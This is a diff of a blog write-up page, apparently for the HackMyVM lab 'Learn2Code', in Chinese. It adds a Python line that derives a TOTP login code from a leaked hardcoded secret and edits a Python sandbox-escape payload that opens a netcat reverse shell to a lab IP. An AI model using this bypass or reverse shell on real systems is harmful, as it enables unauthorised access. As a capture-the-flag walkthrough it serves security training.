@@ -43,7 +43,7 @@
 <meta property="og:image" content="https://pic1.imgdb.cn/item/6a1eff6fb69adaba3f8a13e6.png">
 <meta property="og:image" content="https://pic1.imgdb.cn/item/6a1f02d6b69adaba3f8a1423.png">
 <meta property="article:published_time" content="2025-04-01T09:31:00.000Z">
-<meta property="article:modified_time" content="2026-06-03T01:37:59.476Z">
+<meta property="article:modified_time" content="2026-06-03T07:05:53.453Z">
 <meta property="article:author" content="ALL">
 <meta property="article:tag" content="Python 升级为交互式 Shell">
 <meta property="article:tag" content="Python 沙箱逃逸">
@@ -180,7 +180,7 @@
 <div class="sidebar-state">
   <div class="sidebar-state-article">
     <div>文章</div>
-    <div class="sidebar-state-number">109</div>
+    <div class="sidebar-state-number">110</div>
   </div>
   <div class="sidebar-state-category">
     <div>分类</div>
@@ -274,6 +274,9 @@
 <p>下载备份文件拿到源码</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">// 引入 Google Authenticator (TOTP 动态口令) 验证库</span></span><br><span class="line">    <span class="keyword">require_once</span> <span class="string">&#x27;GoogleAuthenticator.php&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 实例化 Google Authenticator 对象</span></span><br><span class="line">    <span class="variable">$ga</span> = <span class="keyword">new</span> <span class="title class_">PHPGangsta_GoogleAuthenticator</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 定义用于验证动态口令的 Base32 编码密钥（Secret Key）</span></span><br><span class="line">    <span class="variable">$secret</span> = <span class="string">&quot;S4I22IG3KHZIGQCJ&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 判断前端 AJAX 传递过来的操作类型是否为 &#x27;check_code&#x27;（校验验证码）</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;action&#x27;</span>] == <span class="string">&#x27;check_code&#x27;</span>) &#123;</span><br><span class="line">        <span class="comment">// 获取用户在前端输入的动态验证码</span></span><br><span class="line">        <span class="variable">$code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 验证用户输入的验证码是否与基于当前时间生成的 TOTP 匹配</span></span><br><span class="line">        <span class="comment">// 参数说明：</span></span><br><span class="line">        <span class="comment">// 1. $secret : 共享密钥</span></span><br><span class="line">        <span class="comment">// 2. $code   : 用户提交的验证码</span></span><br><span class="line">        <span class="comment">// 3. 1       : 容差（时间漂移窗口）。设为 1 表示允许前后 1 个时间步长（通常为 30 秒）的误差。</span></span><br><span class="line">        <span class="comment">//              即同时校验&quot;前30秒&quot;、&quot;当前30秒&quot;、&quot;后30秒&quot;的验证码，防止因设备时间轻微不同步导致验证失败。</span></span><br><span class="line">        <span class="variable">$result</span> = <span class="variable">$ga</span>-&gt;<span class="title function_ invoke__">verifyCode</span>(<span class="variable">$secret</span>, <span class="variable">$code</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 根据验证结果进行相应的业务处理</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$result</span>) &#123;</span><br><span class="line">            <span class="comment">// 验证通过：引入并执行 coder.php 文件</span></span><br><span class="line">            <span class="comment">// coder.php 输出的 HTML 内容会作为 AJAX 的 responseText 返回给前端，</span></span><br><span class="line">            <span class="comment">// 前端随后会通过 $(&#x27;body&#x27;).html(response) 将其渲染到页面上。</span></span><br><span class="line">            <span class="keyword">include</span>(<span class="string">&#x27;coder.php&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 验证失败：直接输出 &quot;wrong&quot; 字符串</span></span><br><span class="line">            <span class="comment">// 前端 JS 会检测到响应中包含 &quot;wrong&quot;，从而显示错误提示信息。</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;wrong&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
+<p>这里也可以用 Python 直接生成</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&quot;import pyotp; print(pyotp.TOTP(&#x27;S4I22IG3KHZIGQCJ&#x27;).now())&quot;</span></span><br></pre></td></tr></table></figure>
+
 <p><img src="https://pic1.imgdb.cn/item/6a1e8a5db69adaba3f88162d.png"></p>
 <p>看样子我们必须得通过 <code>code</code> 验证</p>
 <p>查看前端代码发现长度固定为六位</p>
@@ -287,7 +290,7 @@
 <h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><h3 id="Python-沙箱逃逸"><a href="#Python-沙箱逃逸" class="headerlink" title="Python 沙箱逃逸"></a>Python 沙箱逃逸</h3><p>结合上面泄露的源码分析，这里应该是要输入代码</p>
 <p>测试 <code>whoami</code> 报错出一个 Python 错误，说明后端是 Python</p>
 <p><img src="https://pic1.imgdb.cn/item/6a1ee46eb69adaba3f8998b0.png"></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mod=<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>);mod.popen(<span class="string">&#x27;nc -e /bin/bash 192.168.125.4 9999&#x27;</span>).read()</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mod=<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>);mod.popen(<span class="string">&#x27;nc -e /bin/bash 192.168.125.4 9999&#x27;</span>)</span><br></pre></td></tr></table></figure>
 
 <ul>
 <li><p><code>__import__()</code>：Python 的内建函数，用于动态导入模块，等价于 <code>import os</code></p>
@@ -299,8 +302,6 @@
 <li><p>子进程通过 <code>/bin/sh -c</code> 执行传入的命令字符串</p>
 </li>
 <li><p><code>-e /bin/bash</code>：在连接建立后，将 <code>/bin/bash</code> 的 <code>stdin/stdout/stderr</code> 全部重定向到该 TCP Socket</p>
-</li>
-<li><p><code>.read()</code>：在这个场景中，由于 <code>nc</code> 的 stdout 已经被 <code>-e</code> 重定向到了 TCP Socket，所以 <code>.read()</code> 实际上会阻塞，直到 nc 进程结束</p>
 </li>
 </ul>
 <p><img src="https://pic1.imgdb.cn/item/6a1ee6c2b69adaba3f899903.png"></p>
@@ -391,10 +392,10 @@
       </div>
       <div>
         <span class="icon-brush"></span>
-        106k
+        106.1k
         &nbsp;|&nbsp;
         <span class="icon-coffee"></span>
-        08:48
+        08:49
       </div>
       <div>
         <span class="icon-eye"></span>
@@ -427,7 +428,7 @@
 <div class="sidebar-state">
   <div class="sidebar-state-article">
     <div>文章</div>
-    <div class="sidebar-state-number">109</div>
+    <div class="sidebar-state-number">110</div>
   </div>
   <div class="sidebar-state-category">
     <div>分类</div>
@@ -550,7 +551,7 @@
           description: "",
           stripContent: "Learn2Code项目地址：https://downloads.hackmyvm.eu/learn2code.zip 是一个打包好的镜像文件 注意：导入 ova 时一定要选择我已移动，否则没网 使用 Nmap 扫描出开放服务及操作系统版本  弱口令Type the Google Authenticator code访问 80 端口只给了一个输入框  查看源代码发现引入了 /includes/js/functions.js 这一文件 1234567891011121314151617181920",
           date: "Tue Apr 01 2025 17:31:00 GMT+0800",
-          updated: "Wed Jun 03 2026 09:37:59 GMT+0800",
+          updated: "Wed Jun 03 2026 15:05:53 GMT+0800",
           cover: "/images/banner.webp",
         };
       </script>
